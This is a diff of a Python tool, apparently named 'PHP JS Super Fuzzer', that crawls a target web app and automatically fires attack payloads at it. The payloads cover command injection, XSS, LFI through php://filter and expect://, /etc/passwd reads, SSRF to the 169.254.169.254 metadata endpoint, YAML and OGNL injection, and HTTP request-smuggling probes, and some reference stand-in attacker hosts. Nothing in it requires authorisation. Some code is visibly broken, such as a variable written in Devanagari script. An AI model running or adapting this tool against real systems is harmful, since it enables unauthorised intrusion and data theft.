@@ -2,7 +2,7 @@
 """
 ═══════════════════════════════════════════════════════════════════════════
                    P H P  •  J S • S U P E R  •  F U Z Z E R
-                                 ( v5.1 )
+                                 ( v5.5 )
                           Haroon Ahmad Awan
 ═══════════════════════════════════════════════════════════════════════════
 • Dynamic SPA crawler (Angular / React / Vue / Lit / Next / Svelte / HTMX)
@@ -22,30 +22,37 @@
       – AI‑style payload mutation (reversible/encode/scramble)
       – PHP‑LFI, SSRF, RCE via stream wrappers, YAML injection, OGNL injection
       – HTTP/2 & HTTP/3 smuggling, QUIC header fuzz
-• Hardened Playwright loader (timeout+retry+HTTPS ignore + UA rotation)
+• Hardened Playwright loader (timeout+retry + proxy + system‑Chrome + AUTOHOOK)
+• Form‑wait + screenshot in debug mode
 • Friendly User‑Agent rotation for all requests
-• Windows‑safe UTF‑8 logger  →  `super_fuzz.log`
+• Windows‑safe UTF‑8 logger  →  `super_fuzz2.log`
 ═══════════════════════════════════════════════════════════════════════════
 """
 
+import os
+import sys
+import argparse
+import subprocess
+import atexit
 import requests
 import random
 import urllib.parse
 import socket
 import http.client
-import ssl
 import time
 import contextlib
 from collections import deque
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, urljoin, urlencode, quote
 from pathlib import Path
+from bs4 import BeautifulSoup
 from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
 
 # ── Configuration ──────────────────────────────────────────────────────
-PAGE_TIMEOUT = 30_000  # ms
-RETRIES = 2
-LOG_FILE = Path("super_fuzz.log")
-LOG_FILE.write_text("", encoding="utf-8")
+PAGE_TIMEOUT = 60_000  # ms
+RETRIES      = 1
+LOG_FILE     = Path("super_fuzz.log")
+LOG_FILE.write_text("", encoding="utf-8")  # reset
 
 # ── Friendly User‑Agents ───────────────────────────────────────────────
 USER_AGENTS = [
@@ -57,11 +64,24 @@ USER_AGENTS = [
     "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
 ]
 
+# ── Globals set by CLI ─────────────────────────────────────────────────
+DEBUG        = False
+THREADS      = 10
+PROXY        = None
+CHROME_PATH  = None
+AUTOHOOK     = False
+CDP_ENDPOINT = None
+CDP_PORT     = 9222
+chrome_proc  = None
+BROWSER_OVERRIDE = None
+
+
 def get_random_ua():
     return random.choice(USER_AGENTS)
 
 def log(msg, tag="*"):
-    line = f"[{tag}] {msg}"
+    prefix = "[DEBUG]" if DEBUG and tag == "*" else f"[{tag}]"
+    line = f"{prefix} {msg}"
     try:
         print(line)
     except UnicodeEncodeError:
@@ -71,45 +91,93 @@ def log(msg, tag="*"):
 
 # ── Playwright helper ──────────────────────────────────────────────────
 def open_page(p, url, timeout=PAGE_TIMEOUT, retries=RETRIES):
-    for attempt in range(retries + 1):
+    global PROXY, CHROME_PATH, CDP_ENDPOINT, BROWSER_OVERRIDE
+
+    # 1) If --autohook is set, attach (once) and reuse that browser
+    if CDP_ENDPOINT:
+        if BROWSER_OVERRIDE is None:
+            try:
+                BROWSER_OVERRIDE = p.chromium.connect_over_cdp(CDP_ENDPOINT)
+            except Exception as e:
+                log(f"[!] CDP attach failed – {e}", "!")
+                sys.exit(1)
+        browser = BROWSER_OVERRIDE
+
+    # 2) Otherwise launch headless exactly once
+    else:
+        if BROWSER_OVERRIDE is None:
+            launch_args = [
+                "--disable-web-security",
+                "--disable-blink-features=AutomationControlled",
+                "--no-proxy-server",
+                "--proxy-bypass-list=*",
+                "--dns-prefetch-disable",
+            ]
+            launch_kwargs = {
+                "headless": not DEBUG,
+                "args": launch_args,
+                **({"executable_path": CHROME_PATH} if CHROME_PATH else {"channel": "chrome"})
+            }
+            BROWSER_OVERRIDE = p.chromium.launch(**launch_kwargs)
+        browser = BROWSER_OVERRIDE
+
+    # 3) Now create a new context+page and navigate
+    for attempt in range(1, retries+1):
         try:
-            br = p.chromium.launch(
-                headless=True,
-                args=[
-                    "--no-sandbox",
-                    "--disable-web-security",
-                    "--disable-blink-features=AutomationControlled"
-                ],
-            )
-            ctx = br.new_context(
+            ctx = browser.new_context(
                 ignore_https_errors=True,
                 user_agent=get_random_ua(),
-                viewport={"width": 1280, "height": 800},
+                viewport={"width":1280,"height":800},
             )
             ctx.set_default_navigation_timeout(timeout)
-            pg = ctx.new_page()
-            pg.goto(url, wait_until="domcontentloaded")
-            return br, ctx, pg
+            page = ctx.new_page()
+            page.goto(url, wait_until="domcontentloaded", timeout=timeout)
+            with contextlib.suppress(PWTimeout):
+                page.wait_for_load_state("networkidle", timeout=10_000)
+            try:
+                page.wait_for_selector("form", timeout=15_000)
+            except PWTimeout:
+                log("[!] No <form> appeared after 15s", "!")
+            if DEBUG:
+                Path("screenshots").mkdir(exist_ok=True)
+                shot = f"screenshots/{quote(url, safe='')}.png"
+                page.screenshot(path=shot, full_page=True)
+                log(f"[+] Screenshot → {shot}", "+")
+            return browser, ctx, page
+
         except Exception as e:
-            log(f"Playwright fail ({attempt+1}/{retries+1}) – {url} – {e}", "!")
-            with contextlib.suppress(Exception):
-                br.close()
-    # Fallback: raw requests + BeautifulSoup
+            log(f"Playwright fail ({attempt}/{retries}) – {e}", "!")
+            # on a real launch failure, we _don't_ close browser, we might retry
+            time.sleep(0.5)
+
+    # 4) Fallback to requests (single time, no proxies)
+    log("[~] Falling back to requests()", "·")
     try:
-        r = requests.get(url, timeout=10, verify=False, headers={"User-Agent": get_random_ua()})
-        if r.status_code == 200:
-            from bs4 import BeautifulSoup
-            soup = BeautifulSoup(r.text, "html.parser")
-            dummy = type("Dummy", (), {})()
-            dummy.close = lambda: None
-            return dummy, None, type("DummyPage", (), {
-                "query_selector_all": soup.select,
-                "evaluate": lambda _: [],
-                "on": lambda *a, **k: None,
-            })()
-    except Exception:
-        pass
-    return None, None, None
+        sess = requests.Session()
+        sess.trust_env = False
+        r = sess.get(
+            url,
+            timeout=20,
+            verify=False,
+            headers={"User-Agent": get_random_ua()}
+        )
+        r.raise_for_status()
+        soup = BeautifulSoup(r.text, "html.parser")
+        dummy = type("Dummy", (), {"close": lambda self: None})()
+        DummyPage = type("DummyPage", (), {
+            "query_selector_all": soup.select,
+            "evaluate": lambda self, *_: [],
+            "on": lambda self, *a, **k: None,
+            "wait_for_load_state": lambda *a, **k: None,
+        })
+        log("[+] Static fallback loaded", "+")
+        return dummy, None, DummyPage()
+
+    except Exception as e:
+        log(f"[!] Static fallback failed – {e}", "!")
+        return None, None, None
+
+
 
 # ── AI‑style payload mutator ───────────────────────────────────────────
 def ai_mutate(payload):
@@ -117,291 +185,332 @@ def ai_mutate(payload):
         payload[::-1],
         urllib.parse.quote(payload),
         payload.replace(" ", "%20"),
-        payload.replace("id", "whoami"),
-        payload.replace("alert", "Function('al'+'ert()')()"),
-        ''.join(random.sample(payload, len(payload))),
+        payload.replace("id","whoami"),
+        payload.replace("alert","Function('al'+'ert()')()"),
+        ''.join(random.sample(payload,len(payload))),
     ]
     return random.choice(variants)
 
 # ── Form fuzzer ────────────────────────────────────────────────────────
 def fuzz_html_form(action, method, fields):
     samples = {
-        "id": "whoami",
-        "q": "<svg/onload=alert(1)>",
-        "x": "gopher://127.0.0.1/._/._/payload",
-        "search": "data:text/html,<script>alert(9)</script>",
-        "file": "php://filter/convert.base64-encode/resource=index.php",
+        "id":"whoami",
+        "q":"<svg/onload=alert(1)>",
+        "x":"gopher://127.0.0.1/._/._/payload",
+        "search":"data:text/html,<script>alert(9)</script>",
+        "file":"php://filter/convert.base64-encode/resource=index.php",
     }
     data = {f: ai_mutate(random.choice(list(samples.values()))) for f in fields}
+    headers = {"User-Agent":get_random_ua()}
     try:
-        headers = {"User-Agent": get_random_ua()}
-        if method == "post":
-            r = requests.post(action, data=data, timeout=5, headers=headers)
+        if method=="post":
+            r = requests.post(action, data=data, timeout=2, headers=headers)
         else:
-            r = requests.get(action + "?" + urlencode(data), timeout=5, headers=headers)
-        if any(k in r.text for k in ("uid=", "root:", "alert(", "<svg")):
+            r = requests.get(action+"?"+urlencode(data), timeout=2, headers=headers)
+        if any(k in r.text for k in ("uid=","root:","alert(","<svg")):
             log(f"Form vulnerable → {action}", "✓")
-    except requests.RequestException:
-        pass
-
-# ── Smart SPA / API crawler ────────────────────────────────────────────
-def smart_crawl(seed, p, max_depth=3, same_origin=True):
-    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
-    discovered, endpoints = {seed}, set()
-    failed = set()
-    queue = deque([(seed, 0)])
-    while queue:
-        current, depth = queue.popleft()
-        if depth > max_depth or current in failed:
-            continue
-        br, ctx, page = open_page(p, current)
-        if not page:
-            failed.add(current)
-            continue
-        page.on("request", lambda req: endpoints.add(req.url))
-        for form in page.query_selector_all("form"):
-            action = form.get_attribute("action") or current
-            method = (form.get_attribute("method") or "get").lower()
-            fields = [
-                i.get_attribute("name") or f"field{i}"
-                for i in form.query_selector_all("input,textarea,select")
-            ]
-            endpoints.add(urljoin(current, action))
-            fuzz_html_form(urljoin(current, action), method, fields)
-        with contextlib.suppress(PWTimeout):
-            page.wait_for_load_state("networkidle", timeout=5000)
-        links = page.evaluate("""() => Array.from(
-            document.querySelectorAll('[href],[routerLink],a'))
-            .map(e => e.href || e.getAttribute('href') || e.getAttribute('routerLink'))""")
-        br.close()
-        for raw in set(links):
-            if not raw:
-                continue
-            url = urljoin(current, raw)
-            if same_origin and not url.startswith(origin):
-                continue
-            if url not in discovered:
-                discovered.add(url)
-                queue.append((url, depth + 1))
-    log(f"Crawler → {len(discovered)} pages, {len(endpoints)} endpoints", "+")
-    return discovered | endpoints
+    except Exception as e:
+        if DEBUG: log(f"Form fuzz error {action} – {e}", "!")
 
 # ── Server‑side attack modules ─────────────────────────────────────────
 def recursive_param(u):
-    suffixes = ["?x=http://evil.com?y=whoami", "?next=/admin?cmd=id", "?eval=phpinfo()"]
-    for s in suffixes:
-        with contextlib.suppress(Exception):
-            r = requests.get(u + s, timeout=5, headers={"User-Agent": get_random_ua()})
-            if any(x in r.text for x in ("uid=", "root:")):
-                log(f"Recursive param RCE → {u + s}", "✓")
+    for s in ["?x=http://evil.com?y=whoami","?next=/admin?cmd=id","?eval=phpinfo()"]:
+        try:
+            r = requests.get(u+s, timeout=2, headers={"User-Agent":get_random_ua()})
+            if any(x in r.text for x in ("uid=","root:")):
+                log(f"Recursive RCE → {u+s}", "✓")
+        except: pass
 
 def protocol_abuse(u):
-    schemes = [
-        "gopher://127.0.0.1:11211/_stats",
-        "file:///etc/passwd",
-        "blob:http://localhost",
-        "data:text/html,<script>alert(6)</script>",
-        "php://input",
-        "php://filter/convert.base64-encode/resource=index.php",
-    ]
-    for proto in schemes:
-        with contextlib.suppress(Exception):
-            r = requests.get(u + "?p=" + quote(proto), timeout=5, headers={"User-Agent": get_random_ua()})
-            if any(x in r.text for x in ("uid=", "root:")):
+    for proto in ["gopher://127.0.0.1:11211/_stats","file:///etc/passwd",
+                  "blob:http://localhost","data:text/html,<script>alert(6)</script>",
+                  "php://input","php://filter/convert.base64-encode/resource=index.php"]:
+        try:
+            r = requests.get(u+"?p="+quote(proto), timeout=2,
+                             headers={"User-Agent":get_random_ua()})
+            if any(x in r.text for x in ("uid=","root:")):
                 log(f"Protocol abuse → {proto}", "✓")
+        except: pass
 
 def split_eval(u):
-    for frag in ['";alert', '("XSS")', "';eval", "('`id`')"]:
-        with contextlib.suppress(Exception):
-            r = requests.get(u + "?q=" + quote(frag), headers={"User-Agent": get_random_ua()})
-            if any(tag in r.text for tag in ("<script", "alert(", "XSS")):
-                log(f"Split‑eval triggered → {frag}", "✓")
+    for frag in ['";alert','("XSS")',"';eval","('`id`')"]:
+        try:
+            r = requests.get(u+"?q="+quote(frag),
+                             headers={"User-Agent":get_random_ua()})
+            if any(tag in r.text for tag in ("<script","alert(","XSS")):
+                log(f"Split‑eval → {frag}", "✓")
+        except: pass
 
 def mime_confuse(u):
-    with contextlib.suppress(Exception):
-        headers = {"Content-Type": "application/json", "User-Agent": get_random_ua()}
-        r = requests.post(u, "<script>alert(1)</script>", headers=headers, timeout=5)
+    try:
+        r = requests.post(u, "<script>alert(1)</script>",
+                          headers={"Content-Type":"application/json",
+                                   "User-Agent":get_random_ua()},
+                          timeout=2)
         if "<script" in r.text:
-            log("MIME confusion success", "✓")
+            log("MIME confusion ✓","✓")
+    except: pass
 
 def unicode_path(u):
-    for enc in ("%252e%252e", "%c0%ae%c0%ae", "%u202e"):
-        with contextlib.suppress(Exception):
-            r = requests.get(f"{u}/{enc}/", timeout=5, headers={"User-Agent": get_random_ua()})
+    for enc in ("%252e%252e","%c0%ae%c0%ae","%u202e"):
+        try:
+            r = requests.get(f"{u}/{enc}/", timeout=2,
+                             headers={"User-Agent":get_random_ua()})
             if "root:" in r.text or "conf" in r.text:
                 log(f"Unicode bypass → {enc}", "✓")
+        except: pass
 
 def lfi_fuzz(u):
-    paths = ["/etc/passwd", "/var/www/html/index.php", "/etc/hosts", "../../../../../../etc/passwd"]
-    wrappers = ["php://filter/convert.base64-encode/resource=", "expect://id", "input://"]
-    for w in wrappers:
-        for pth in paths:
-            url = f"{u}?file={w}{pth}"
-            with contextlib.suppress(Exception):
-                r = requests.get(url, timeout=5, headers={"User-Agent": get_random_ua()})
-                if any(x in r.text for x in ("root:", "ID=")):
-                    log(f"LFI fuzz → {url}", "✓")
+    paths = ["/etc/passwd","/var/www/html/index.php","/etc/hosts","../../../../../../etc/passwd"]
+    for w in ["php://filter/convert.base64-encode/resource=","expect://id","input://"]:
+        for p in paths:
+            url = f"{u}?file={w}{p}"
+            try:
+                r = requests.get(url, timeout=2,
+                                 headers={"User-Agent":get_random_ua()})
+                if any(x in r.text for x in ("root:","ID=")):
+                    log(f"LFI fuzz → {url}","✓")
+            except: pass
 
 def ssrf_fuzz(u):
-    payloads = ["http://169.254.169.254/latest/meta-data/", "gopher://127.0.0.1:22/"]
-    for p in payloads:
-        url = f"{u}?url={quote(p)}"
-        with contextlib.suppress(Exception):
-            r = requests.get(url, timeout=5, headers={"User-Agent": get_random_ua()})
-            if r.status_code == 200:
-                log(f"SSRF fuzz → {p}", "✓")
-
-def http2_smuggle(host):
-    try:
-        conn = http.client.HTTPConnection(host, 80, timeout=4)
-        conn._http_vsn = 32
-        conn._http_vsn_str = 'HTTP/2.0'
-        conn.putrequest("SMUGGLE", "/")
-        conn.putheader("Host", host)
-        conn.endheaders()
-        conn.send(b"0\r\n\r\n")
-        log("HTTP2 smuggle probe sent", "+")
-        conn.close()
-    except Exception:
-        pass
+    for p in ["http://169.254.169.254/latest/meta-data/","gopher://127.0.0.1:22/"]:
+        try:
+            r = requests.get(f"{u}?url={quote(p)}", timeout=2,
+                             headers={"User-Agent":get_random_ua()})
+            if r.status_code==200:
+                log(f"SSRF fuzz → {p}","✓")
+        except: pass
 
 def yaml_injection(u):
-    payload = "foo: !!python/object/apply:os.system ['id']"
-    url = f"{u}?data={quote(payload)}"
-    with contextlib.suppress(Exception):
-        r = requests.get(url, timeout=5, headers={"User-Agent": get_random_ua()})
+    try:
+        payload = quote("foo: !!python/object/apply:os.system ['id']")
+        r = requests.get(f"{u}?data={payload}", timeout=2,
+                         headers={"User-Agent":get_random_ua()})
         if "uid=" in r.text:
-            log("YAML injection ✓", "✓")
+            log("YAML injection ✓","✓")
+    except: pass
 
 def ognl_injection(u):
-    payload = "%{(#_='multipart/form-data')." \
-              "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']" \
-              ".addHeader('X',#_))}"
-    url = f"{u}?name={quote(payload)}"
-    with contextlib.suppress(Exception):
-        r = requests.get(url, timeout=5, headers={"User-Agent": get_random_ua()})
+    pay = "%{(#_='multipart/form-data')."\
+          "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"\
+          ".addHeader('X',#_))}"
+    try:
+        r = requests.get(f"{u}?name={quote(pay)}", timeout=2,
+                         headers={"User-Agent":get_random_ua()})
         if "X" in r.headers:
-            log("OGNL injection ✓", "✓")
+            log("OGNL injection ✓","✓")
+    except: pass
 
-def crlf_smuggle(host):
-    payload = f"GET / HTTP/1.1\r\nHost:{host}\r\nX:Y\r\n\r\nPOST /admin HTTP/1.1\r\n\r\n"
-    with contextlib.suppress(Exception):
-        s = socket.create_connection((host, 80), timeout=4)
-        s.send(payload.encode())
-        s.close()
-        log("CRLF smuggle probe sent", "+")
-
-def chunk_desync(host):
-    raw = f"POST / HTTP/1.1\r\nHost:{host}\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\n"
-    with contextlib.suppress(Exception):
-        s = socket.create_connection((host, 80), timeout=4)
-        s.send(raw.encode())
-        s.close()
-        log("Chunk‑desync probe sent", "+")
-
-# ── Client‑side DOM attack modules ─────────────────────────────────────
-def dom_clipboard(u, p):
-    br, _, pg = open_page(p, u)
+# ── Client‑side DOM modules ─────────────────────────────────────────────
+def dom_clipboard(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
         pg.evaluate("document.body.innerHTML+='<input oncopy=fetch(\"http://dns.x\")>'")
-        log("Clipboard payload ✓", "✓")
-        br.close()
+        log("Clipboard ✓","✓"); br.close()
 
-def dom_prototype_pollution(u, p):
-    br, _, pg = open_page(p, u)
+def dom_proto_poll(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
-        pg.on("console", lambda m: "[PP]" in m.text and log("Prototype polluted", "✓"))
+        pg.on("console",lambda m:"[PP]" in m.text and log("Proto polluted","✓"))
         pg.evaluate("let e=JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');"
                     "Object.assign({},e);console.log(\"[PP]\"+{}.polluted)")
         br.close()
 
-def dom_websocket_injection(u, p):
-    br, _, pg = open_page(p, u)
+def dom_ws_inject(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
-        pg.on("console", lambda m: "[WS]" in m.text and log("WS echo XSS ✓", "✓"))
+        pg.on("console",lambda m:"[WS]" in m.text and log("WS XSS","✓"))
         pg.evaluate('const w=new WebSocket("wss://echo.websocket.events");'
                     'w.onopen=()=>w.send("<svg/onload=alert(2)>");'
                     'w.onmessage=e=>console.log("[WS]"+e.data);')
-        time.sleep(1.2)
-        br.close()
+        time.sleep(1); br.close()
 
-def dom_async_timing(u, p):
-    br, _, pg = open_page(p, u)
+def dom_async(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
         pg.evaluate("(async()=>{let x=await new Promise(r=>setTimeout(()=>r('alert(7)'),150));eval(x)})();")
-        log("Async race ✓", "✓")
-        br.close()
+        log("Async race","✓"); br.close()
 
-def dom_iframe_clone(u, p):
-    br, _, pg = open_page(p, u)
+def dom_iframe(u,p):
+    ब्र,_,pg = open_page(p,u)
     if pg:
         pg.evaluate("let f=document.createElement('iframe');"
                     "f.srcdoc='<script>alert(99)</script>';document.body.appendChild(f)")
-        log("Iframe clone ✓", "✓")
-        br.close()
+        log("Iframe clone","✓"); ब्र.close()
 
-def dom_mutation_observer(u, p):
-    br, _, pg = open_page(p, u)
+def dom_mutation(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
-        pg.evaluate("new MutationObserver(()=>alert('MutationX')).observe(document.body,"
-                    "{childList:true,subtree:true});"
+        pg.evaluate("new MutationObserver(()=>alert('M')).observe(document.body,{childList:true,subtree:true});"
                     "document.body.appendChild(document.createElement('div'));")
-        log("MutationObserver ✓", "✓")
-        br.close()
+        log("MutationObs","✓"); br.close()
 
-def websocket_fuzz(u, p):
-    br, _, pg = open_page(p, u)
+def websocket_fuzz(u,p):
+    br,_,pg = open_page(p,u)
     if pg:
-        ws_url = u.replace('http', 'ws')
+        ws = u.replace('http','ws')
         pg.evaluate(f'''
-            const ws=new WebSocket("{ws_url}/socket");
-            ws.onopen=()=>ws.send("{quote('<svg/onload=alert(5)>')}");
-            ws.onmessage=e=>console.log("[WF]"+e.data);
+            const w=new WebSocket("{ws}/socket");
+            w.onopen=()=>w.send("{quote('<svg/onload=alert(5)>')}");
+            w.onmessage=e=>console.log("[WF]"+e.data);
         ''')
-        time.sleep(1)
-        log("WebSocket fuzz ✓", "✓")
-        br.close()
+        time.sleep(1); log("WS fuzz","✓"); br.close()
 
-# ── Orchestrator ───────────────────────────────────────────────────────
-def run(seed_url):
-    host = urlparse(seed_url).hostname or seed_url
-    log(f"Seed → {seed_url}", "◆")
-
-    with sync_playwright() as p:
-        scope = smart_crawl(seed_url, p, max_depth=3)
-    log(f"Targets discovered: {len(scope)}", "+")
-
-    for u in scope:
-        recursive_param(u)
-        protocol_abuse(u)
-        split_eval(u)
-        mime_confuse(u)
-        unicode_path(u)
-        lfi_fuzz(u)
-        ssrf_fuzz(u)
-        yaml_injection(u)
-        ognl_injection(u)
-
-    crlf_smuggle(host)
-    chunk_desync(host)
-    http2_smuggle(host)
-
-    with sync_playwright() as p:
-        dom_clipboard(seed_url, p)
-        dom_prototype_pollution(seed_url, p)
-        dom_websocket_injection(seed_url, p)
-        dom_async_timing(seed_url, p)
-        dom_iframe_clone(seed_url, p)
-        dom_mutation_observer(seed_url, p)
-        websocket_fuzz(seed_url, p)
-
-    log("✅ SUPER‑FUZZER COMPLETE", "✓")
-
-if __name__ == "__main__":
+# ── Smuggle probes ──────────────────────────────────────────────────────
+def crlf_smuggle(host):
+    payload = (
+        f"GET / HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"X-Ignore: 1\r\n\r\n"
+        f"POST /admin HTTP/1.1\r\n"
+        f"Host: {host}\r\nContent-Length: 0\r\n\r\n"
+    )
     try:
-        target = input("Target URL: ").strip()
-        run(target)
-    except KeyboardInterrupt:
-        log("Aborted by user", "!")
+        s = socket.create_connection((host,80),timeout=4)
+        s.send(payload.encode()); s.close()
+        log("CRLF smuggle probe sent","+")
     except Exception as e:
-        log(f"Fatal error: {e}", "✘")
+        if DEBUG: log(f"CRLF smuggle error – {e}","!")
+
+def chunk_desync(host):
+    raw = (f"POST / HTTP/1.1\r\nHost:{host}\r\n"
+           "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
+    try:
+        s = socket.create_connection((host,80),timeout=4)
+        s.send(raw.encode()); s.close()
+        log("Chunk‑desync probe sent","+")
+    except Exception as e:
+        if DEBUG: log(f"Chunk‑desync error – {e}","!")
+
+def http2_smuggle(host):
+    try:
+        conn = http.client.HTTPConnection(host,80,timeout=4)
+        conn._http_vsn=32; conn._http_vsn_str="HTTP/2.0"
+        conn.putrequest("SMUGGLE","/");conn.putheader("Host",host)
+        conn.endheaders();conn.send(b"0\r\n\r\n");conn.close()
+        log("HTTP2 smuggle sent","+")
+    except Exception as e:
+        if DEBUG: log(f"HTTP2 smuggle error – {e}","!")
+
+# ── Crawl + orchestrate ────────────────────────────────────────────────
+def smart_crawl(seed,p):
+    origin = "{0.scheme}://{0.netloc}".format(urlparse(seed))
+    seen, endpoints, failed = {seed}, set(), set()
+    queue = deque([(seed,0)])
+    while queue:
+        url,depth = queue.popleft()
+        if depth>3 or url in failed: continue
+        br,ctx,page = open_page(p,url)
+        if not page: failed.add(url); continue
+        page.on("request",lambda r:endpoints.add(r.url))
+
+        forms = page.query_selector_all("form")
+        log(f"[+] Found {len(forms)} <form> elements on {url}","+")
+        for form in forms:
+            act = form.get_attribute("action") or url
+            meth = (form.get_attribute("method") or "get").lower()
+            fields = [inp.get_attribute("name") or f"f{i}"
+                      for i,inp in enumerate(form.query_selector_all("input,textarea,select"),1)]
+            endpoints.add(urljoin(url,act))
+            fuzz_html_form(urljoin(url,act),meth,fields)
+
+        with contextlib.suppress(PWTimeout):
+            page.wait_for_load_state("networkidle",timeout=2000)
+
+        links = page.evaluate("""()=>
+            Array.from(document.querySelectorAll('[href],[routerLink],a'))
+                 .map(e=>e.href||e.getAttribute('href')||e.getAttribute('routerLink'))
+        """)
+        br.close()
+        for l in set(links):
+            if l and l.startswith(origin) and l not in seen:
+                seen.add(l); queue.append((l,depth+1))
+
+    log(f"Crawl → {len(seen)} pages, {len(endpoints)} endpoints","+")
+    return seen|endpoints
+
+# ── Threaded server‑side fuzz ─────────────────────────────────────────
+def run_server(u):
+    mods = [recursive_param,protocol_abuse,split_eval,
+            mime_confuse,unicode_path,lfi_fuzz,
+            ssrf_fuzz,yaml_injection,ognl_injection]
+    for fn in mods:
+        log(f"· Running {fn.__name__} against {u}","·")
+        try: fn(u)
+        except Exception as e:
+            if DEBUG: log(f"  ! {fn.__name__} error: {e}","!")
+        log(f"· Finished {fn.__name__} against {u}","·")
+
+def main():
+    global DEBUG,THREADS,PROXY,CHROME_PATH,AUTOHOOK,CDP_ENDPOINT,chrome_proc
+    parser=argparse.ArgumentParser()
+    parser.add_argument("url", help="Target URL")
+    parser.add_argument("-U","--threads", type=int, default=10, help="Server‑side threads")
+    parser.add_argument("--debug", action="store_true", help="Debug (headful+verbose)")
+    parser.add_argument("--proxy", help="HTTP/S proxy")
+    parser.add_argument("--chrome", help="Chrome executable path")
+    parser.add_argument("--autohook", action="store_true",
+                        help="Auto‑hook into Chrome via remote debug")
+    args=parser.parse_args()
+
+    DEBUG = args.debug
+    THREADS = args.threads
+    PROXY = args.proxy or os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
+    CHROME_PATH = args.chrome
+    AUTOHOOK = args.autohook
+
+    if AUTOHOOK:
+        # find Chrome binary
+        candidates = [CHROME_PATH] if CHROME_PATH else []
+        candidates += [
+            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+            "chrome"
+        ]
+        chrome_bin = next((c for c in candidates if c and Path(c).exists()), None)
+        if not chrome_bin:
+            log("[!] Cannot find Chrome, disabling --autohook","!")
+            AUTOHOOK = False
+        else:
+            CDP_ENDPOINT = f"http://127.0.0.1:{CDP_PORT}"
+            data_dir = Path("chrome-user-data").absolute()
+            data_dir.mkdir(exist_ok=True)
+            chrome_proc = subprocess.Popen([
+                chrome_bin,
+                f"--remote-debugging-port={CDP_PORT}",
+                f"--user-data-dir={data_dir}",
+                "--no-first-run",
+                "--no-default-browser-check"
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            atexit.register(lambda: chrome_proc.terminate())
+            for _ in range(20):
+                try:
+                    socket.create_connection(("127.0.0.1",CDP_PORT),timeout=0.5).close()
+                    break
+                except: time.sleep(0.2)
+            log(f"[+] Auto‑hook launched Chrome at {CDP_ENDPOINT}","+")
+    # kickoff
+    log(f"Seed → {args.url}","◆")
+    with sync_playwright() as p:
+        scope = smart_crawl(args.url, p)
+    log(f"Discovered {len(scope)} targets","+")
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        futures={ex.submit(run_server,u):u for u in scope}
+        for f in as_completed(futures):
+            if DEBUG: log(f"Completed server fuzz for {futures[f]}","·")
+    host = urlparse(args.url).hostname or args.url
+    crlf_smuggle(host); chunk_desync(host); http2_smuggle(host)
+    with sync_playwright() as p:
+        for mod in (dom_clipboard,dom_proto_poll,dom_ws_inject,
+                    dom_async,dom_iframe,dom_mutation,websocket_fuzz):
+            try: mod(args.url,p)
+            except Exception as e:
+                if DEBUG: log(f"{mod.__name__} error – {e}","!")
+    log("✅ FUZZER COMPLETE","✓")
+
+if __name__=="__main__":
+    try:
+        main()
+    finally:
+        if AUTOHOOK and chrome_proc:
+            chrome_proc.terminate()
